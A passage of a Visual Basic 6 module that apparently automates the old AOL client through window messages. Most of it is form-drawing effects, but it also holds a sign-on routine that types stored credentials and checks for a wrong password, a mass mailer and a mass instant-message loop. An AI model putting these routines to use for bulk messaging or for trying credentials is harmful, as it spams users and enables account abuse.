Edi2 As Long, Edi3 As Long, icona As Long, i As Integer, an As Long
    If OnlineOrNot = True Then
        MsgBox ("Must be offline to use this feature."), vbInformation, ("Error")
        Exit Sub
    End If

Do: DoEvents
aol& = FindWindow("AOL Frame25", vbNullString)
mdi& = FindWindowEx(aol&, 0&, "MDIClient", vbNullString)
chil& = FindWindowEx(mdi&, 0&, "AOL Child", vbNullString)
Tit1& = FindChildByTitle(mdi&, chil&, "Sign On")
Tit2& = FindChildByTitle(mdi&, chil&, "Goodbye from America Online!")
    Tit& = IIf(Tit1& <> 0, Tit1&, Tit2&)
DoEvents
Combo& = FindWindowEx(Tit&, 0&, "_AOL_Combobox", vbNullString)
Edi& = FindWindowEx(Tit&, 0&, "_AOL_Edit", vbNullString)
icona& = FindWindowEx(Tit&, 0&, "_AOL_Icon", vbNullString)
If Combo& <> 0 And icona& <> 0 Then Exit Do
Loop
'''''''''''''''''''''''''''''''''''''''''''''''''
Call SendMessage(Combo&, WM_LBUTTONDOWN, 0, 0&)
Call SendMessage(Combo&, WM_LBUTTONUP, 0, 0&)
Call SendMessage(Combo&, WM_LBUTTONDOWN, 0, 0&)
Call SendMessage(Combo&, WM_LBUTTONUP, 0, 0&)
    If Edi& <> 0 Then
For i = 1 To 9
Call SendMessageByNum(Combo&, WM_KEYDOWN, VK_RIGHT, 0)
Call SendMessageByNum(Combo&, WM_KEYUP, VK_RIGHT, 0)
Wait (0.2)
Next i
    End If
    DoEvents
   icona& = GetWindow(icona&, GW_HWNDNEXT)
        icona& = GetWindow(icona&, GW_HWNDNEXT)
            icona& = GetWindow(icona&, GW_HWNDNEXT)
            Call ClickButton(icona&)
'''''''''''''''''''''''''''''''''''''''''''''''''
Call WaitForModal
Wait (0.2)
Modal& = FindWindow("_AOL_Modal", vbNullString)
Stat& = FindWindowEx(Modal&, 0&, "_AOL_Static", vbNullString)
IconB& = FindWindowEx(Modal&, 0&, "_AOL_Icon", vbNullString)
Edi& = FindWindowEx(Modal&, 0&, "_AOL_Edit", vbNullString)
    Edi2& = GetWindow(Edi&, GW_HWNDNEXT)
        Edi3& = GetWindow(Edi2&, GW_HWNDNEXT)
Call SendMessageByString(Edi&, WM_SETTEXT, 0, GName)
Call SendMessageByString(Edi3&, WM_SETTEXT, 0, GPass)

Call SendMessage(IconB&, WM_LBUTTONDOWN, 0, 0&)
Call SendMessage(IconB&, WM_LBUTTONUP, 0, 0&)
Do: DoEvents
an& = FindWindow("#32770", vbNullString)
Wait (0.5)
     If OnlineOrNot = True Then
            Wait (0.5)
            Exit Sub
     End If
Loop Until an& <> 0
Call SendMessage(an&, WM_CLOSE, 0, 0&)
Wait (0.5)

Call SendMessageByString(Edi&, WM_SETTEXT, 0, GName)
Call SendMessageByString(Edi3&, WM_SETTEXT, 0, GPass)
Call SendMessage(IconB&, WM_LBUTTONDOWN, 0, 0&)
Call SendMessage(IconB&, WM_LBUTTONUP, 0, 0&)
Wait (0.5)
'''wrong pw
aol& = FindWindow("AOL Frame25", vbNullString)
mdi& = FindWindowEx(aol&, 0&, "MDIClient", vbNullString)
chil& = FindWindowEx(mdi&, 0&, "AOL Child", vbNullString)
Tit& = FindChildByTitle(mdi&, chil&, "Goodbye from America Online!")
Stat& = FindWindowEx(Tit&, 0&, "_AOL_Static", vbNullString)
    If Stat& <> 0 Then
        Call SendMessageByString(Stat&, WM_SETTEXT, 0, "    ><> Died??   ")
    End If

End Sub

Function Text_FirstBold(txt As String) As String
Dim i As Integer, l As String, _
s As String, t As String, first As String, _
Fs As Boolean

If Len(txt) = 0 Then Exit Function

If Not Mid(txt, 1, 1) = " " Then
   first = "<B>" & Mid(txt, 1, 1) & "</B>" & Mid(txt, 2, Len(txt))
   Fs = False
Else
   first = txt
   Fs = True
End If



For i = 2 To Len(first)
l = Mid(first, i, 1)
    If Mid(first, i - 1, 1) = " " Then
        s = "<B>" & l & "</B>"
    Else
        s = l
    End If
    
t = t & s
Next i
    If Fs = False Then
        Text_FirstBold = "<" & t
    Else
        Text_FirstBold = t
    End If

End Function

Public Sub ClickButton(WHwnd As Long)
Call SendMessage(WHwnd, WM_LBUTTONDOWN, 0, 0&)
DoEvents
Call SendMessage(WHwnd, WM_LBUTTONUP, 0, 0&)
DoEvents
End Sub



Public Sub Picture_ClearGraphics(Pict As PictureBox)
'this is very easy..yet usefull
Pict.Cls

End Sub


Function Picture_GetPixel(Frm As Form, PicB As PictureBox, Xcoord As Integer, Ycoord As Integer)
'This is a little faster than VB's Point function
Dim ColorC As Long, RedVal As Integer, _
GreenVal As Integer, BlueVal As Integer

        If Frm.ScaleMode = vbPixels Then
            ColorC = GetPixel(PicB.hdc, Xcoord, Ycoord)
            Picture_GetPixel = ColorC
        Else
            ColorC = GetPixel(PicB.hdc, Xcoord \ Screen.TwipsPerPixelX, Ycoord \ Screen.TwipsPerPixelY)
            Picture_GetPixel = ColorC
        End If
    
    RedVal = ColorC Mod 256 'if left alone the color
    ColorC = (ColorC - RedVal) / 256 'code will be
    GreenVal = ColorC Mod 256 'in a long format
    ColorC = (ColorC - GreenVal) / 256 'dividing by
    BlueVal = ColorC '256 and keeping the remainder
    'will seperate red from green and from blue
Picture_GetPixel = RedVal & " " & GreenVal & " " & BlueVal
'format looks like "255 255 255"
End Function

Public Sub Picture_SetPixel(ObjectHdc As Variant, Xcoord As Integer, Ycoord As Integer, ColorC As Long)
On Local Error Resume Next
Dim NDC As Long
'color code must be long, try using vb colors (VBRed,VBBlue)
'make sure scalemode is in pixels not twips or
'you will probably mess it up

Call SetPixel(ObjectHdc.hdc, Xcoord, Ycoord, ColorC)
    If Err Then
        NDC = GetDC(ObjectHdc)
        Call SetPixel(NDC, Xcoord, Ycoord, ColorC)
    End If

End Sub




Public Sub Picture_DelBackground(Pict As PictureBox, DestPict As PictureBox, Optional ColorCode As Variant)
'you can leave the colorcode out, i made it take
'the color thats in the upper left corner as the
'color to leave transparented
'*YOU CAN USE VB COLORS IN THIS EX: VBWhite, or VBGreen
Dim Xi As Integer, Yi As Integer, _
CC As Long
Pict.ScaleMode = vbPixels
DestPict.ScaleMode = vbPixels
    If IsMissing(ColorCode) Then
        ColorCode = GetPixel(Pict.hdc, 0, 0)
    End If 'optional argument left out

For Yi = 0 To Pict.ScaleHeight - 1

    For Xi = 0 To Pict.ScaleWidth '- 1
        CC = GetPixel(Pict.hdc, Xi, Yi) 'get color
            If CC <> ColorCode Then 'if not trans color
        Call SetPixel(DestPict.hdc, Xi, Yi, CC) 'set it
            End If
    Next Xi

Next Yi
End Sub
Public Sub Picture_DelBackground2(Pict As PictureBox, DestPict As PictureBox, DestX As Integer, DestY As Integer, Optional ColorCode As Variant)
'On this sub you can start the picture from
'wherever in the destination, x and y are those
'coordinates

Dim Xi As Integer, Yi As Integer, _
CC As Long
    If IsMissing(ColorCode) Then
        ColorCode = GetPixel(Pict.hdc, 0, 0)
    End If 'optional argument left out

For Yi = 0 To Pict.ScaleHeight - 1

    For Xi = 0 To Pict.ScaleWidth
        CC = GetPixel(Pict.hdc, Xi, Yi) 'get color
            If CC <> ColorCode Then 'if not trans color
        Call SetPixel(DestPict.hdc, Xi + DestX, Yi + DestY, CC) 'set it
            End If
    Next Xi
    
Next Yi
End Sub


Public Sub PlayMIDI(mFileP As String)
'this was written awhile ago and should still work, my
'audio isnt workin though and MIDI's cant
'be played on my comp, let me know if this
'doesnt work anymore

    Call mciSendString("open " & mFileP & " Type sequencer Alias MYMID", 0&, 0, 0)
    Call mciSendString("play MYMID", 0&, 0, 0)

End Sub

Function DesignTime() As Boolean
    Dim RunMode As Boolean, DataRet As Long, DBuff As String
    Dim buffer
    DBuff = Space$(255)
    DataRet = GetModuleFileNameA(0&, DBuff, Len(DBuff))
    buffer = UCase(Left(DBuff, DataRet))
          If LCase(Right(buffer, 9)) = "\vb32.exe" Then
         RunMode = True
          Else
         RunMode = False
          End If
DesignTime = RunMode
End Function

Public Sub Form_Gradient(Frm As Form, _
Rv As Integer, Gv As Integer, _
Bv As Integer, StatR As Boolean, StatG As Boolean, _
statb As Boolean)
'Rv,Gv, and Bv are Red, Green, and Blue RGB values
'0 to 255, 255 being the brightest. StatR, G , and
'B are Boolean (TRUE/FALSE) values for if you want
'a certain color to stay that value

Dim PStat As Integer, Rad As Integer, _
Hx As Integer, Hy As Integer

PStat = Frm.ScaleMode
Frm.ScaleMode = vbPixels
Hx = Frm.ScaleWidth \ 2
Hy = Frm.ScaleHeight \ 2
Frm.DrawWidth = 2
    For Rad = 0 To Frm.ScaleHeight
        Frm.Circle (Hx, Hy), Rad, RGB(Rv, Gv, Bv)
    If StatR = False Then Let Rv = Val(Rv) + 1
    If StatG = False Then Let Gv = Val(Gv) + 1
    If statb = False Then Let Bv = Val(Bv) + 1
        Next Rad
Frm.ScaleMode = PStat

End Sub


Sub PicFade_BlueGreen(Pic As PictureBox)
Dim NumberOfRects As Integer, i As Integer, Gc, X As Integer

    Pic.ScaleMode = 3
    Pic.DrawStyle = 6
    Pic.DrawWidth = 1
    Pic.AutoRedraw = True
    NumberOfRects = 64

    For i = 1 To 64
        X = 255 - (i * 4 - 1)
         
        Gc = RGB(255, X + 5, X)
        Pic.Line (0, Pic.ScaleHeight * (i - 1) / 64)-(Pic.ScaleWidth, Pic.ScaleHeight * i / 64), Gc, BF
         
    Next i
End Sub
Sub PicFade_Blue(Pic As PictureBox)
Dim i As Integer, NumberOfRects As Integer, Gc As Long, X As Long
    Pic.ScaleMode = 3
    Pic.DrawStyle = 6
    Pic.DrawWidth = 1
    Pic.AutoRedraw = True
    NumberOfRects = 64
     

    For i = 1 To 64
       X = 255 - (i * 4 - 1)
         
        Gc = RGB(255, 255, X)
        Pic.Line (0, Pic.ScaleHeight * (i - 1) / 64)-(Pic.ScaleWidth, Pic.ScaleHeight * i / 64), Gc, BF
         
    Next i
End Sub
Sub PicFade_Gold(Pic As PictureBox)
Dim i As Integer, NumberOfRects As Integer, X As Long, Gc As Long
    Pic.ScaleMode = 3
    Pic.DrawStyle = 6
    Pic.DrawWidth = 1
    Pic.AutoRedraw = True
    NumberOfRects = 64
     

    For i = 1 To 64
       X = 255 - (i * 4 - 1)
         
        Gc = RGB(X + 5, X, 255)
        Pic.Line (0, Pic.ScaleHeight * (i - 1) / 64)-(Pic.ScaleWidth, Pic.ScaleHeight * i / 64), Gc, BF
         
    Next i
End Sub
Sub PicFade_Green(Pic As PictureBox)
Dim i As Integer, NumberOfRects As Integer, X As Long, Gc As Long
    Pic.ScaleMode = 3
    Pic.DrawStyle = 6
    Pic.DrawWidth = 1
    Pic.AutoRedraw = True
    NumberOfRects = 64
     

    For i = 1 To 64
       X = 255 - (i * 4 - 1)
         
        Gc = RGB(255, X, 170)
        Pic.Line (0, Pic.ScaleHeight * (i - 1) / 64)-(Pic.ScaleWidth, Pic.ScaleHeight * i / 64), Gc, BF
         
    Next i
End Sub
Sub PicFade_Grey(Pic As PictureBox)
Dim i As Integer, NumberOfRects As Integer, X As Long, Gc As Long
    Pic.ScaleMode = 3
    Pic.DrawStyle = 6
    Pic.DrawWidth = 1
    Pic.AutoRedraw = True
    NumberOfRects = 64
     

    For i = 1 To 64
       X = 255 - (i * 4 - 1)
         
        Gc = RGB(X + 25, X + 25, X + 25)
        Pic.Line (0, Pic.ScaleHeight * (i - 1) / 64)-(Pic.ScaleWidth, Pic.ScaleHeight * i / 64), Gc, BF
         
    Next i
End Sub
Sub PicFade_Purple(Pic As PictureBox)
Dim i As Integer, NumberOfRects As Integer, X As Long, Gc As Long
    Pic.ScaleMode = 3
    Pic.DrawStyle = 6
    Pic.DrawWidth = 1
    Pic.AutoRedraw = True
    NumberOfRects = 64
     

    For i = 1 To 64
       X = 255 - (i * 4 - 1)
         
        Gc = RGB(X + 5, 255, X)
        Pic.Line (0, Pic.ScaleHeight * (i - 1) / 64)-(Pic.ScaleWidth, Pic.ScaleHeight * i / 64), Gc, BF
         
    Next i
End Sub
Sub PicFade_Red(Pic As PictureBox)
Dim i As Integer, NumberOfRects As Integer, X As Long, Gc As Long
    Pic.ScaleMode = 3
    Pic.DrawStyle = 6
    Pic.DrawWidth = 1
    Pic.AutoRedraw = True
    NumberOfRects = 64
     

    For i = 1 To 64
       X = 255 - (i * 4 - 1)
         
        Gc = RGB(X, 255, 170)
        Pic.Line (0, Pic.ScaleHeight * (i - 1) / 64)-(Pic.ScaleWidth, Pic.ScaleHeight * i / 64), Gc, BF
         
    Next i
End Sub
Function MailList2String(Lis As ListBox)
Dim X As Integer, Names As String
    For X = 0 To Lis.ListCount - 1
Names$ = Names$ & Lis.List(X) & ","
    Next X
        MailList2String = Mid(Names$, 1, Len(Names$) - 1)
    
End Function










Sub SendMailList(Lis As ListBox, subj As String, Messg As String)
'hate when you make a mass mailer and one of the
'names in the list is wrong? this fixes and remails
'Ex: Call SendMailList(List1,"my subject","my message")
'use this AS the mail send sub
Dim aol As Long, mdi As Long, titl As Long, View As Long, Cut1$, look, l$, Lettas$
Dim Names$, last, SPBuffa$, sendnum, LastName, ListOfNames
Dim i, f, ln, li2, li, k As Integer, Chil1 As Long, Chil2 As Long, chil As Long
Dim WButtn As Long, Tit2 As Long, Edi As Long, Prob As String, _
WrongNames As String, l2 As String, NStrin As String, ListOfNames2 As String
Dim cnt As Integer
cnt = 0
ListOfNames = MailList2String(Lis)
    Call SendMail(ListOfNames, subj, Messg)
Do: DoEvents
aol& = FindWindow("AOL Frame25", vbNullString)
mdi& = FindWindowEx(aol&, 0&, "MDIClient", vbNullString)
chil& = FindWindowEx(mdi&, 0&, "AOL Child", vbNullString)
titl& = FindChildByTitle(mdi&, chil&, "Error")
WButtn& = FindWindowEx(titl&, 0&, "_AOL_Icon", vbNullString)
Tit2& = FindChildByTitle(mdi&, chil&, "Write Mail")
Edi& = FindWindowEx(Tit2&, 0&, "_AOL_Edit", vbNullString)
View& = FindWindowEx(titl&, 0&, "_AOL_View", vbNullString)
If titl& <> 0 Or cnt = 6 Then Exit Do
Wait (0.5)
Loop
''''''''''''''''''
If titl& <> 0 Then
    sendnum = SendMessageByNum(View&, 14, 0, 0&)
    SPBuffa$ = Space$(sendnum)
    last = SendMessageByString(View&, 13, sendnum + 1, SPBuffa$)
    Prob$ = SPBuffa$
         Call SendMessage(titl&, WM_CLOSE, 0, 0&)
Cut1$ = Mid(Prob$, InStr(Prob$, Chr(10) & Chr(13)) + 3, Len(Prob$))
     Call SendMessage(WButtn&, WM_LBUTTONDOWN, 0, 0&)
     Call SendMessage(WButtn&, WM_LBUTTONUP, 0, 0&)
Dim n As Integer
'''''''final cut, names
look = InStr(Cut1$, "-")
For n = 1 To Len(Cut1$)
l$ = Mid(Cut1$, n, 1)
If l$ = "-" Then
Names$ = Names$ & Mid(Lettas$, 1, Len(Lettas$) - 1) & ","
Lettas$ = ""
End If
    If l$ = Chr(13) Then Let l$ = "": Lettas$ = ""
    If l$ = Chr(10) Then Let l$ = "": Lettas$ = ""
Lettas$ = Lettas$ & l$
Next n


    WrongNames = (Mid(Names$, 1, Len(Names$)))
        For f = 1 To Len(WrongNames)
        l2$ = Mid(WrongNames, f, 1)
          If l2$ = "," Then
            Let l2$ = ""
            For k = 0 To Lis.ListCount - 1
              li = Lis.List(k)
              If LCase(li) = LCase(NStrin) Then Lis.RemoveItem k
            Next k
               NStrin = ""
          End If
       NStrin = NStrin & l2$
   Next f
   LastName = Right(WrongNames, InStr(WrongNames, ",") - 2)
          
          For ln = 0 To Lis.ListCount - 1
              li2 = Lis.List(ln)
              If LCase(li2) = LCase(LastName) Then Lis.RemoveItem ln
            Next ln
       Wait (0.5)
     ListOfNames2 = MailList2String(Lis)
     
    
Wait (0.3)
    Call SendMessage(Edi&, WM_LBUTTONDBLCLK, 0, 0&)
    Call SendMessageByString(Edi&, WM_SETTEXT, 0, ListOfNames2)

    For i = 1 To 28
        Edi& = GetWindow(Edi&, GW_HWNDNEXT)
    Next i
  Call ClickButton(Edi&)

  Dim Modal As Long, Stat As Long, IconB As Long
Dim Lc As Integer
For Lc = 1 To 4
Wait (0.5)
    Modal& = FindWindow("_AOL_Modal", vbNullString)
    Stat& = FindWindowEx(Modal&, 0&, "_AOL_Static", vbNullString)
    IconB& = FindWindowEx(Modal&, 0&, "_AOL_Icon", vbNullString)
        If IconB& <> 0 Then
            Call ClickButton(IconB&)
            Exit For
        End If
Next Lc
   End If
   
    
   
End Sub


Sub Aim_MassIm(Lis As ListBox, mess As String)
Dim i As Integer
    For i = 0 To Lis.ListCount
        Call Aim_IM(Lis.List(i), mess)
        Wait (0.5)
    Next i
End Sub


Sub AOL_SetFocus()
Dim aol As Long
aol& = FindWindow("AOL Frame25", vbNullString)
Call FocusSet(aol&)
End Sub


Function APISpy_ClassName()
Dim Handl As Long, Bspace$, Classname
Handl& = APISpy_MouseOver
Bspace$ = String$(250, 0)
Classname = GetClassName(Handl&, Bspace$, 250)
APISpy_ClassName = Bspace$
End Function

Function APISpy_MouseOver()
Dim CurP As POINTAPI
Dim NowP As Long, ThenP As Long

    Call GetCursorPos(CurP)
    NowP& = WindowFromPoint(CurP.X, CurP.Y)

    If NowP& <> ThenP& Then
        ThenP& = NowP&
        APISpy_MouseOver = NowP&
    End If
End Function
Function APISpy_Parent()
Dim Parnt As Long
Parnt& = GetParent(APISpy_MouseOver)
APISpy_Parent = Parnt&
End Function

Function APISpy_ParentName()
Dim WinHand As Long, PClassName, pspace$
WinHand& = APISpy_Parent
pspace$ = String$(250, 0)
PClassName = GetClassName(WinHand&, pspace$, 250)
APISpy_ParentName = pspace$
End Function


Function APISpy_WindowText()
Dim WinTLen As Long, WindowText, Spce$
WinTLen& = GetWindowTextLength(APISpy_MouseOver)
Spce$ = String$(WinTLen&, 0)
WindowText = GetWindowText(APISpy_MouseOver, Spce$, (WinTLen& + 1))
APISpy_WindowText = Spce$
End Function

Function CheckIfOnline2(SN As String)
'Returns the exact description aol gives
'ex: "User123 is online, but in private room"
Call RunMenuByChar(9, "L")
Do: DoEvents
Dim aol As Long, mdi As Long, Tit As Long, Edi As Long, icona As Long, Tit2 As Long, No As Long, Stat&
Dim fillit, clickit, closeit, AreThey, SPBuffa$, last, sendnum, chil As Long
aol& = FindWindow("AOL Frame25", vbNullString)
mdi& = FindWindowEx(aol&, 0&, "MDIClient", vbNullString)
chil& = FindWindowEx(mdi&, 0&, "AOL Child", vbNullString)
Tit& = FindChildByTitle(mdi&, chil&, "Locate Member Online")
Edi& = FindWindowEx(Tit&, 0&, "_AOL_Edit", vbNullString)

If Tit& <> 0 And Edi& <> 0 Then Exit Do
Loop
Call SendMessageByString(Edi&, WM_SETTEXT, 0, SN)
icona& = FindWindowEx(Tit&, 0&, "_AOL_Icon", vbNullString)
Call ClickButton(icona&)

Do: DoEvents
No& = FindWindow("#32770", vbNullString)
Tit2& = FindChildByTitle(mdi&, chil&, "Locate " & SN)
Stat& = FindWindowEx(Tit2&, 0&, "_AOL_Static", vbNullString)
If No& <> 0 Or Tit2& <> 0 Then Exit Do
Loop
If No& <> 0 Then
Call SendMessage(No&, WM_CLOSE, 0, 0&)
Call SendMessage(Tit&, WM_CLOSE, 0, 0&)
AreThey = SN & " is Not Online"
ElseIf Tit2& <> 0 Then
sendnum = SendMessageByNum(Stat&, 14, 0&, 0&)
SPBuffa$ = Space$(sendnum)
last = SendMessageByString(Stat&, 13, sendnum + 1, SPBuffa$)
Call SendMessage(Tit2&, WM_CLOSE, 0, 0&)
Call SendMessage(Tit&, WM_CLOSE, 0, 0&)
AreThey = SPBuffa$
End If
CheckIfOnline2 = AreThey




End Function

Function FindChat()
Dim aol As Long, mdi As Long, chil As Long, Stat As Long, Lis As Long, _
Combo As Long, icona As Long, Rich As Long
aol& = FindWindow("AOL Frame25", vbNullString)
mdi& = FindWindowEx(aol&, 0&, "MDIClient", vbNullString)
chil& = FindWindowEx(mdi&, 0&, "AOL Child", vbNullString)
Combo& = FindWindowEx(chil&, 0&, "_AOL_Combobox", vbNullString)
Lis& = FindWindowEx(chil&, 0&, "_AOL_Listbox", vbNullString)
Stat& = FindWindowEx(chil&, 0&, "_AOL_Static", vbNullString)
icona& = FindWindowEx(chil&, 0&, "_AOL_Icon", vbNullString)
Rich& = FindWindowEx(chil&, 0&, "RICHCNTL", vbNullString)
If Combo& <> 0 And Lis& <> 0 And Stat& <> 0 Then
FindChat = chil&
End If
        If Combo& = 0 Or Lis& = 0 Or Stat& = 0 Then
Do: DoEvents
chil& = FindWindowEx(mdi&, chil&, "AOL Child", vbNullString)
Combo& = FindWindowEx(chil&, 0&, "_AOL_Combobox", vbNullString)
Lis& = FindWindowEx(chil&, 0&, "_AOL_Listbox", vbNullString)
Stat& = FindWindowEx(chil&, 0&, "_AOL_Static", vbNullString)
icona& = FindWindowEx(chil&, 0&, "_AOL_Icon", vbNullString)
Rich& = FindWindowEx(chil&, 0&, "RICHCNTL", vbNullString)
  If Combo& <> 0 And Lis& <> 0 And Stat& <> 0 Then Exit Do
Loop Until chil& = 0
FindChat = chil&
End If

End Function



Sub Form_MakeAOLMyChild(Frm As Form)
'MAKE SURE YOU CLOSE AOL BEFORE ENDING PROGRAM
'MIGHT CAUSE ERROR
Dim aol As Long
aol& = FindWindow("AOL Frame25", vbNullString)
Call SetParent(aol&, Frm.hwnd)
End Sub

Sub Form_MakeMeAOLChild(Frm As Form)
Dim aol As Long
aol& = FindWindow("AOL Frame25", vbNullString)
Call SetParent(Frm.hwnd, aol&)
End Sub
Sub Form_PaintScreen(Frm As Form)

Dim tpx As Integer, tpy As Integer, pxlt As Integer, _
pxll As Integer, Snap As Long

Frm.AutoRedraw = True
tpx = Screen.TwipsPerPixelX
tpy = Screen.TwipsPerPixelY

pxlt = Frm.Top / tpy
pxll = Frm.Left / tpx
Snap& = GetDesktopWindow
Call BitBlt(Frm.hdc, 0, 0, Frm.Width, Frm.Height, GetDC(Snap&), 0, 0, SRCCOPY)
Frm.Refresh
End Sub

Sub Form_Shrink(Frm As Form)
Dim X As Integer, Y As Integer, i As Integer
X = Frm.Width
Y = Frm.Height
For i = Frm.Height To 1 Step -1
Frm.Height = i
Frm.Width = Val(Y) - 1
Y = Frm.Width
Next i

End Sub
Sub Form_ShrinkEnd(Frm As Form)
Dim X As Integer, Y As Integer, i As Integer
X = Frm.Width
Y = Frm.Height
For i = Frm.Height To 1 Step -1
Frm.Height = i
Frm.Width = Val(Y) - 1
Y = Frm.Width
Next i
End
End Sub
Sub Form_ShrinkFast(Frm As Form)
Dim X As Integer, Y As Integer, i As Integer
X = Frm.Width
Y = Frm.Height
For i = Frm.Height To 1 Step -10
Frm.Height = i
Frm.Width = Val(Y) - 8
Y = Frm.Width
Next i

End Sub








Sub FormShade_Yellow(Frm As Form)
Dim i As Integer, X As Integer, Gc As Long, NumberOfRects As Integer
    Frm.ScaleMode = 3
    Frm.DrawStyle = 6
    Frm.DrawWidth = 1
    Frm.AutoRedraw = True
    NumberOfRects = 64
     

    For i = 1 To 64
        X = 255 - (i * 4 - 1)
         
        Gc = RGB(FF, AA, X)
        Frm.Line (0, Frm.ScaleHeight * (i - 1) / 64)-(Frm.ScaleWidth, Frm.ScaleHeight * i / 64), Gc, BF
         
    Next i

        Frm.Refresh
End Sub
Sub FormShade_Purple(Frm As Form)
Dim i As Integer, X As Integer, Gc As Long, NumberOfRects As Integer
    Frm.ScaleMode = 3
    Frm.DrawStyle = 6
    Frm.DrawWidth = 1
    Frm.AutoRedraw = True
    NumberOfRects = 64
     

    For i = 1 To 64
        X = 255 - (i * 4 - 1)
         
        Gc = RGB(FF, X, AA)
        Frm.Line (0, Frm.ScaleHeight * (i - 1) / 64)-(Frm.ScaleWidth, Frm.ScaleHeight * i / 64), Gc, BF
         
    Next i

        Frm.Refresh
End Sub
Sub Form_LightShow(Frm As Form)
'put this in a timer
Frm.Line (Int(Rnd * Frm.Width), Int(Rnd * Frm.Height))-(Int(Rnd * Frm.Width), Int(Rnd * Frm.Height)), QBColor(Rnd * 15)
End Sub


Sub FormMove(Frm As Form)
'moves form without clicking the border
        ReleaseCapture
        SendMessage Frm.hwnd, WM_SYSCOMMAND, SC_MOVE, 0
Frm.Refresh
End Sub

Function File_GetAttributes(Path As String)
Dim FA As Integer
FA = GetAttr(Path)
If FA = 0 Then Let FA = "Normal": GoTo GotIt
If FA = 1 Then Let FA = "ReadOnly": GoTo GotIt
If FA = 2 Then Let FA = "Hidden": GoTo GotIt
If FA = 4 Then Let FA = "System": GoTo GotIt
If FA = 16 Then Let FA = "Directory": GoTo GotIt
If FA = 32 Then Let FA = "Archive": GoTo GotIt

GotIt:
File_GetAttributes = FA
End Function


Sub FormShade_Red(Frm As Form)
Dim i As Integer, X As Integer, Gc As Long, NumberOfRects As Integer
    Frm.ScaleMode = 3
    Frm.DrawStyle = 6
    Frm.DrawWidth = 1
    Frm.AutoRedraw = True
    NumberOfRects = 64
     

    For i = 1 To 64
        X = 255 - (i * 4 - 1)
         
        Gc = RGB(FF, X + 5, X)
        Frm.Line (0, Frm.ScaleHeight * (i - 1) / 64)-(Frm.ScaleWidth, Frm.ScaleHeight * i / 64), Gc, BF
         
    Next i

        Frm.Refresh
End Sub


Sub FormShade_BW(Frm As Form)
Dim i As Integer, X As Integer, Gc As Long, NumberOfRects As Integer
    Frm.ScaleMode = 3
    Frm.DrawStyle = 6
    Frm.DrawWidth = 1
    Frm.AutoRedraw = True
    NumberOfRects = 64
     

    For i = 1 To 64
        X = 255 - (i * 4 - 1)
         
        Gc = RGB(X, X, X)
        Frm.Line (0, Frm.ScaleHeight * (i - 1) / 64)-(Frm.ScaleWidth, Frm.ScaleHeight * i / 64), Gc, BF
         
    Next i

        Frm.Refresh
End Sub



Sub FormShade_Green(Frm As Form)
Dim i As Integer, X As Integer, Gc As Long, NumberOfRects As Integer
    Frm.ScaleMode = 3
    Frm.DrawStyle = 6
    Frm.DrawWidth = 1
    Frm.AutoRedraw = True
    NumberOfRects = 64
     

    For i = 1 To 64
        X = 255 - (i * 4 - 1)
         
        Gc = RGB(X, FF, X)
        Frm.Line (0, Frm.ScaleHeight * (i - 1) / 64)-(Frm.ScaleWidth, Frm.ScaleHeight * i / 64), Gc, BF
         
    Next i

        Frm.Refresh
End Sub

Sub FormShade_BlueGreen(Frm As Form)
Dim i As Integer, X As Integer, Gc As Long, NumberOfRects As Integer
    Frm.ScaleMode = 3
    Frm.DrawStyle = 6
    Frm.DrawWidth = 1
    Frm.AutoRedraw = True
    NumberOfRects = 64
     

    For i = 1 To 64
        X = 255 - (i * 4 - 1)
         
        Gc = RGB(X, FF, AA)
        Frm.Line (0, Frm.ScaleHeight * (i - 1) / 64)-(Frm.ScaleWidth, Frm.ScaleHeight * i / 64), Gc, BF
         
    Next i

        Frm.Refresh
End Sub

Sub FormShade_Blue(Frm As Form)
Dim i As Integer, X As Integer, Gc As Long, NumberOfRects As Integer
    Frm.ScaleMode = 3
    Frm.DrawStyle = 6
    Frm.DrawWidth = 1
    Frm.AutoRedraw = True
    NumberOfRects = 64
     

    For i = 1 To 64
        X = 255 - (i * 4 - 1)
         
        Gc = RGB(X, X, 255)
        Frm.Line (0, Frm.ScaleHeight * (i - 1) / 64)-(Frm.ScaleWidth, Frm.ScaleHeight * i / 64), Gc, BF
         
    Next i

        Frm.Refresh
End Sub

Function GetCursorPosition()
Dim Pos As POINTAPI
Call GetCursorPos(Pos)
GetCursorPosition = (Pos.X & " " & Pos.Y)

End Function

Sub Ghost_Off()
Dim aol As Long, mdi As Long, Tit As Long, icona As Long, _
Tit2 As Long, IconB As Long, g As Long, chk As Long, tit3 As Long, _
numWin As Long, chil As Long

Do: DoEvents
aol& = FindWindow("AOL Frame25", vbNullString)
mdi& = FindWindowEx(aol&, 0&, "MDIClient", vbNullString)
chil& = FindWindowEx(mdi&, 0&, "AOL Child", vbNullString)
Tit& = FindChildByTitle(mdi&, chil&, "Buddy List Window")
    If Tit& = 0 Then
        Call RunMenuByChar(9, "V")
    End If
If Tit& <> 0 Then Exit Do
Loop

icona& = FindWindowEx(Tit&, 0&, "_AOL_Icon", vbNullString)
    icona& = GetWindow(icona&, GW_HWNDNEXT)
                  icona& = GetWindow(icona&, GW_HWNDNEXT)
            icona& = GetWindow(icona&, GW_HWNDNEXT)
            icona& = GetWindow(icona&, GW_HWNDNEXT)
            
    Call ClickButton(icona&)
Do: DoEvents
Tit2& = FindChildByTitle(mdi&, chil&, "Buddy Lists")
IconB& = FindWindowEx(Tit2&, 0&, "_AOL_Icon", vbNullString)
If Tit2& <> 0 And IconB& <> 0 Then Exit Do
Loop

    IconB& = GetWindow(IconB&, GW_HWNDNEXT)
            IconB& = GetWindow(IconB&, GW_HWNDNEXT)
                IconB& = GetWindow(IconB&, GW_HWNDNEXT)
                    IconB& = GetWindow(IconB&, GW_HWNDNEXT)
                        
    Call ClickButton(IconB&)
Do: DoEvents
tit3& = FindChildByTitle(mdi&, chil&, "Privacy Preferences")
chk& = FindWindowEx(tit3&, 0&, "_AOL_Checkbox", vbNullString)
If tit3& <> 0 And chk& <> 0 Then Exit Do
Loop
      
    
    Do: DoEvents
    Call SendMessage(chk&, BM_SETCHECK, True, 0&)
    g& = SendMessage(chk&, BM_GETCHECK, 0, 0&)
    If g& <> 0 Then Exit Do
    Loop
    chk& = GetWindow(chk&, GW_HWNDNEXT)
    chk& = GetWindow(chk&, GW_HWNDNEXT)
    chk& = GetWindow(chk&, GW_HWNDNEXT)
   chk& = GetWindow(chk&, GW_HWNDNEXT)
     
chk& = GetWindow(chk&, GW_HWNDNEXT)
    chk& = GetWindow(chk&, GW_HWNDNEXT)
    chk& = GetWindow(chk&, GW_HWNDNEXT)
   
   
chk& = GetWindow(chk&, GW_HWNDNEXT)
chk& = GetWindow(chk&, GW_HWNDNEXT)
